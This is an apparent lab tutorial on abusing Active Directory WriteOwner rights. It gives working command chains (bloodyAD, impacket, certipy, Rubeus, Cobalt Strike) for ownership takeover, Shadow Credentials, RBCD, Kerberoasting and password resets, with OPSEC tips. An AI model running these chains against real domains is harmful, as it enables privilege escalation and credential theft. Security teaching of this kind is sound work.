---
title: ⚔️DACL - WriteOwner
date: 2025-10-28 01:06:00 +/-TTTT
categories: [DACL]
tags: [WriteOwner]     # TAG names should always be lowercase
image : /assets/images/writeownerbackground.png
---
# **WriteOwner on User → User**

## **WriteOwner on User → User happening why?**

Before start lets learn why is happening? where to check and verify?

We have to open `dsa.msc` → ADUC first and make sure its enabled.

1. Go to the **Security** tab.
    - If you don’t see it: in ADUC, click **View → Advanced Features**, then open Properties again.
2. Click **Advanced**.

Now we can go our target to verify

1. We can go our target directly and `right click` and select `Properties`  After u select victim user and check `Permissions` and go `Advcaned` double click on victim user and u will see `Modiy Owner`
    
![alt text](../assets/images/dacl45.png)
    

We also use **dsacls** to set it or understand why is happenning

```bash
dsacls "CN=harun,CN=Users,DC=lab,DC=local" /G LAB\eda:WO
```

## **WriteOwner on User → User Verify**

### **WriteOwner on User → User Verify w PowerView**

Best way to verify **WriteOwner** is Bloodhound off course but lets start if we have **PowerView Access**

https://github.com/aniqfakhrul/powerview.py

```bash
powerview lab.local/'eda:police'@VALENOR-DC01.lab.local --dc-ip 192.168.1.10 --web --web-host 0.0.0.0 --web-port 3000 --web-auth user:password1234
```

we can connect how we did all times and we need `EDA` ’s SID for this we can use [sharpview](https://github.com/tevora-threat/SharpView) u can find here tho

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x86/SharpView.exe

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_x86/SharpView.exe ConvertTo-SID -Name eda
```

![alt text](../assets/images/dacl46.png)
or with powerview off course

```bash
╭─LDAPS─[VALENOR-DC01.lab.local]─[lab\eda]-[NS:<auto>] [WEB]
╰─PV ❯ Get-DomainUser -Identity eda -Select ObjectSid 
S-1-5-21-589091694-2085784919-2275157148-1236
```

and verify with

```bash
Get-DomainObjectAcl -ResolveGUIDs -SecurityIdentifier S-1-5-21-589091694-2085784919-2275157148-1236
```

![alt text](../assets/images/dacl47.png)

### **WriteOwner on User → User Verify w find-aces**

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

```bash
python3 main.py --auth "ldap+ntlm-password://lab.local\\eda:police@VALENOR-DC01.lab.local"
```

and just give 

```bash
find_object_aces <username> - Search for ACEs for a specific user                                                                                            
```

![alt text](../assets/images/dacl48.png)

Very strong tool!!!

### **WriteOwner on User → User Verify w Bloodhound**

And off course easiest and common way is bloodhound

![alt text](../assets/images/dacl49.png)

## **WriteOwner on User → User Attack**

As we said with **WriteOwner** we have `Write` and we can do Reset user password, add to group, **Kerberoasting etc etc.**

### **WriteOwner on User → User Attack Kerberoasting (impacket)**

**1. T1558.003 – Kerberoasting**

We can use 2 methods here

![alt text](../assets/images/dacl50.png)

so we can use [impacket](https://github.com/fortra/impacket) tool and [targetedkerberoast](https://github.com/ShutdownRepo/targetedKerberoast) directly

First of all let us understand what we will do

`EDA` has **WriteOwner** on `Harun` so we can **OWN** user first! after we have **OWN** on target user we will have **Full Privileges** on our target User so we can change password did kerberoasting, etc etc.

For **OWN** user

```bash
owneredit.py -action write -new-owner eda -target harun 'lab.local/eda:police'

dacledit.py -action 'write' -rights 'FullControl' -principal 'eda' -target 'harun' 'lab.local/eda:police'
```

![alt text](../assets/images/dacl51.png)

after we did it we will see on `ADUC`

![alt text](../assets/images/writeownertogenericall.png)


and now we can do **Kerberoasting**

![alt text](../assets/images/dacl52.png)

### **WriteOwner on User → User Attack  Force Change Password (bloodyAD)**

Lets meet most powerfull tool of Active Directory [bloodyAD](https://github.com/CravateRouge/bloodyAD)

https://github.com/CravateRouge/bloodyAD

Great tool all things can done with bloodyAD!

First of all let us understand what we will do

`EDA` has **WriteOwner** on `Harun` so we can **OWN** user first! after we have **OWN** on target user we will have **Full Privileges** on our target User so we can change password 

And my own tool will rise here!!! u dont need to change ur bloodyAD commands anymore!!!

https://github.com/lineeralgebra/autobloodyAD

U just have to run and give params.

```bash
python3 autobloodyAD.py
=== BloodyAD Attack Command Generator ===
Choose an attack vector:
1. Retrieve User Information
2. Add User To Group
3. Change Password
4. Give User GenericAll Rights
5. WriteOwner
6. ReadGMSAPassword
7. Enable a Disabled Account
8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
Enter your choice (e.g., 1, 2, 3...): 5

Choose WriteOwner option:
1. WriteOwner on User
2. WriteOwner on Computer
3. WriteOwner on Groups
Enter your choice (1, 2, 3): 1
Enter dc: VALENOR-DC01.lab.local
Enter domain: lab.local
Enter username: eda
Enter password: police
Enter target_user: harun

Generated Commands:
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eda -p police set owner harun eda
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eda -p police add genericAll harun eda
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eda -p police set password harun NewStrongPassword123!
```

![alt text](../assets/images/dacl53.png)

U just have to copy and paste commands

![alt text](../assets/images/dacl54.png)

bommm!!!!

### **WriteOwner on User → User Attack Shadow Credentials attack**

Thats the **BEST** way to do it cause ChangePassword is bad for OPSEC and kerberoasting?? maybe u will not able to crack password.!!!!

We can do easily with [certipy](https://github.com/ly4k/Certipy) btw!!!

But before do this we still need **Full Privileges** on target user lets do with bloodyAD just for **Full Privileges** with `WriteOwner` and `Give User GenericAll Rights`

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eda -p police set owner harun eda
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eda -p police add genericAll harun eda

[!] S-1-5-21-589091694-2085784919-2275157148-1236 is already the owner, no modification will be made
[+] eda has now GenericAll on harun
```

after that it will be

![alt text](../assets/images/writeownertogenericall.png)

now we can do Shadow Attack

```bash
certipy-ad shadow auto -username eda@lab.local -password police -account harun -dc-ip 192.168.1.10
```

![alt text](../assets/images/dacl55.png)

### **WriteOwner on User → User Attack with Cobalt Strike for OPSEC**

All the things we need to should be good for `OPSEC` so thats why i didnt user Cobalt Strike at forcechangepassword and kerberoasting.

```bash
Set-DomainObjectOwner -Identity 'eda' -OwnerIdentity 'harun'

Add-DomainObjectAcl -Rights 'All' -TargetIdentity "eda" -PrincipalIdentity "harun"
```

and after this commands we will have Full Privilgees

![alt text](../assets/images/writeownertogenericall.png)

and now we can do **Shadow Credentials attack** with Whisker and Rubeus u can find here tho

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Whisker.exe

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Whisker.exe add /target:harun /domain:lab.local /dc:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl56.png)

and now we can run this command directly

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe asktgt /user:harun /certificate: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 /password:"aLv3Ya9bWjJEIujz" /domain:lab.local /dc:VALENOR-DC01.lab.local /getcredentials /show
```

![alt text](../assets/images/dacl57.png)

# **WriteOwner on User → Computer**

Before start lets learn why is happening? where to check and verify?

We have to open `dsa.msc` → ADUC first and make sure its enabled.

1. Go to the **Security** tab.
    - If you don’t see it: in ADUC, click **View → Advanced Features**, then open Properties again.
2. Click **Advanced**.,Now we can go our target to verify
3. We can go our target directly and `right click` and select `Properties`  After u select victim user and check `Permissions` and click `Advanced` after that look for our user u will see:
    
![alt text](../assets/images/dacl58.png)
    

## **WriteOwner on User → Computer Verify**

### **WriteOwner on User → Computer Verify w PowerView**

Best way to verify **WriteOwner** is Bloodhound off course but lets start if we have **PowerView Access**

https://github.com/aniqfakhrul/powerview.py

```bash
powerview lab.local/'eda:police'@VALENOR-DC01.lab.local --dc-ip 192.168.1.10 --web --web-host 0.0.0.0 --web-port 3000 --web-auth user:password1234
```

we can connect how we did all times and we need `EDA` ’s SID for this we can use [sharpview](https://github.com/tevora-threat/SharpView) u can find here tho

```bash
╭─LDAPS─[VALENOR-DC01.lab.local]─[lab\eda]-[NS:<auto>] [WEB]
╰─PV ❯ Get-DomainUser -Identity eda -Select ObjectSid 
S-1-5-21-589091694-2085784919-2275157148-1236
```

and verify with

```bash
Get-DomainObjectAcl -ResolveGUIDs -SecurityIdentifier S-1-5-21-589091694-2085784919-2275157148-1236
```

![alt text](../assets/images/dacl59.png)

### **WriteOwner on User → Computer Verify w find-aces**

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

```bash
python3 main.py --auth "ldap+ntlm-password://lab.local\\eda:police@VALENOR-DC01.lab.local"
```

and just give 

```bash
find_object_aces <username> - Search for ACEs for a specific user                                                                                            
```

![alt text](../assets/images/dacl60.png)

Very strong tool!!!

### **WriteOwner on User → Computer Verify w Bloodhound**

And off course easiest and common way is bloodhound

![alt text](../assets/images/dacl61.png)

## **WriteOwner on User → Computer Attack**

As we said with **WriteOwner** we have `Write` and we can do **RBCD** and **Shadow Credentials attack**

### **WriteOwner on User → Computer Attack RBCD(Linux Abuse)**

**WriteOwner** logic is too easy. **OWN** target and do **GenericAll**

So with User if we have writeowner just had to be own Computer and do RBCD!!!

![alt text](../assets/images/dacl62.png)

For **OWN** computer

```bash
owneredit.py -action write -new-owner eda -target TROY$ 'lab.local/eda:police'

dacledit.py -action 'write' -rights 'FullControl' -principal 'eda' -target 'TROY$' 'lab.local/eda:police'
```

or lets do with bloodyAD right? cause it was easiest way.

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eda -p police set owner TROY$ eda
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eda -p police add genericAll TROY$ eda

[+] Old owner S-1-5-21-589091694-2085784919-2275157148-512 is now replaced by eda on TROY$
[+] eda has now GenericAll on TROY$
```

now we have full privleges on Computer we can verify with

![alt text](../assets/images/writeownertogenericall2.png)

Now we can do RBCD cause we have **Full Privileges** or **GenericAll**

```bash
addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM3$' -computer-pass 'Summer2020!' -dc-host VALENOR-DC01.lab.local -domain-netbios lab.local 'lab.local/eda:police' 

rbcd.py -delegate-from 'ATTACKERSYSTEM3$' -delegate-to 'TROY$' -action 'write' 'lab.local/eda:police'

getST.py -spn 'cifs/TROY.lab.local' -impersonate 'administrator' 'lab.local/attackersystem3$:Summer2020!'
```

![alt text](../assets/images/dacl63.png)

and we can verify with.

![alt text](../assets/images/dacl64.png)


### **WriteOwner on User → Computer Attack RBCD(C2 Abuse)**

Now lets do same things with Cobalt Strike

All the things we need to should be good for `OPSEC`

```bash
Set-DomainObjectOwner -Identity 'eda' -OwnerIdentity 'TROY$'

Add-DomainObjectAcl -Rights 'All' -TargetIdentity "eda" -PrincipalIdentity "TROY$"
```

and after this commands we will have Full Privilgees

![alt text](../assets/images/writeownertogenericall2.png)

1. Lets start with add computer with [StandIN.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/StandIn.exe) but  Before add computer we have to sure maq≠0

we can check with

```bash
powershell-import /home/elliot/tools/PowerView.ps1
powerpick Get-DomainObject -Identity "dc=lab,dc=local" -Domain lab.local
```
![alt text](../assets/images/dacl65.png)

now we ccan create computer!!!

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/StandIn.exe --computer ALEMDAR --make --Domain lab.local
```

![alt text](../assets/images/dacl66.png)

1. Set RBCD

![alt text](../assets/images/dacl67.png)

1. Lets get rc4 hash of attacker computer

```bash
execute-assembly /home/elliot/tools/Rubeus.exe hash /password:qDpE0HbdsHlt9Iy /user:ALEMDAR$ /domain:VALENOR-DC01.lab.local
[09/04 22:03:04] [*] Tasked beacon to run .NET program: Rubeus.exe hash /password:qDpE0HbdsHlt9Iy /user:ALEMDAR$ /domain:VALENOR-DC01.lab.local
[09/04 22:03:04] [+] host called home, sent: 556372 bytes
[09/04 22:03:04] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Calculate Password Hash(es)

[*] Input password             : qDpE0HbdsHlt9Iy
[*] Input username             : ALEMDAR$
[*] Input domain               : VALENOR-DC01.lab.local
[*] Salt                       : VALENOR-DC01.LAB.LOCALhostalemdar.valenor-dc01.lab.local
[*]       rc4_hmac             : 6E28CED76AAD1C0FCB204D0AAE4239BA

[09/04 22:03:04] [+] received output:
[*]       aes128_cts_hmac_sha1 : 039A37C6C89F47F9D73520101082C50C
[*]       aes256_cts_hmac_sha1 : 9BFC77BF489C2B560FAFC678F30B8671CC5EBF47AC3DCCECD1E49636E13E8A65
[*]       des_cbc_md5          : 13E33B08FEFE61D9
```

1. Now lets craete ticket for Administrator.

Command to execute:

```bash
execute-assembly /home/elliot/tools/Rubeus.exe s4u /user:ALEMDAR$ /password:qDpE0HbdsHlt9Iy /domain:lab.local /impersonateuser:administrator /rc4:6E28CED76AAD1C0FCB204D0AAE4239BA /msdsspn:cifs/TROY.lab.local /nowrap
```

![alt text](../assets/images/dacl68.png)

and here is the boom part!

![alt text](../assets/images/dacl69.png)
### **WriteOwner on User → Computer Attack  Shadow Credentials attack (Linux Abuse)**

Everything will be same we have to make **Full Pvileges for computer and request NT hash**

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eda -p police set owner TROY$ eda
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eda -p police add genericAll TROY$ eda

[!] S-1-5-21-589091694-2085784919-2275157148-1236 is already the owner, no modification will be made
[+] eda has now GenericAll on TROY$
```
![alt text](../assets/images/writeownertogenericall2.png)

we will see we have Full Controll now!! lets use certipy and grab NT hash

```bash
certipy-ad shadow auto -username eda@lab.local -password police -account TROY$ -dc-ip 192.168.1.10
```

![alt text](../assets/images/dacl70.png)

### **WriteOwner on User → Computer Attack  Shadow Credentials attack (C2)**

```bash
Set-DomainObjectOwner -Identity 'eda' -OwnerIdentity 'TROY$'

Add-DomainObjectAcl -Rights 'All' -TargetIdentity "eda" -PrincipalIdentity "TROY"
```

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Whisker.exe

for add on target

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Whisker.exe add /target:TROY$ /domain:lab.local /dc:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl71.png)


and run this

```bash
Rubeus.exe asktgt /user:TROY$ /certificate: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 /password:"8a94nWwcwJoKtnz3" /domain:lab.local /dc:VALENOR-DC01.lab.local /getcredentials /show
```

![alt text](../assets/images/dacl72.png)

## **WriteOwner on User → Groups Attack (most common)**

Thats the most common and favorite misconfiguration on AD envoirements. 

Lets check why is happening first and try to understand what we can do with when permission on `Groups`

```bash
dsacls "CN=TestGroup,CN=Users,DC=lab,DC=local" /G lab\eray:WO
```

Lets say our attacker user has permission on it  and we verifed with [find_aces](https://github.com/L1nvx/find-aces) and bloodhound it will be useless cause we can just add member of this group nothing more but we have **WRITEOWNER** we can give ourself **GENERICALL** and can use Groups permissions with our attacker user after add ourself on group!

![alt text](../assets/images/dacl73.png)

and yeah that means we can **OWN** this group and give ourself **GenericAll**

![alt text](../assets/images/dacl74.png)

so our Attack Path will be **eray** →x→ **ferhat**

- **OWN** testgroup with eray and give **GenericAll** to eray.
- So now we can add ourself on group
- Then we can use Testgroup permissions with eray directly.

![alt text](../assets/images/dacl75.png)

We can verify this with miracle tool easily

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

```bash
python3 main.py --auth "ldap+ntlm-password://lab.local\\eray:banana@VALENOR-DC01.lab.local"
```

and just give 

```bash
find_object_aces <username> - Search for ACEs for a specific user                                                                                            
```

![alt text](../assets/images/dacl76.png)

Very strong tool!!! now lets do attack!!!

Attack aim was too easy:

1. **OWN** group with victim user
2. Give **GENERICALL ourself**
3. add ourself on Group
4. Do group priviliges with victim user

We can do with bloodyAD which is another miracle tool

https://github.com/lineeralgebra/autobloodyAD

![alt text](../assets/images/dacl77.png)

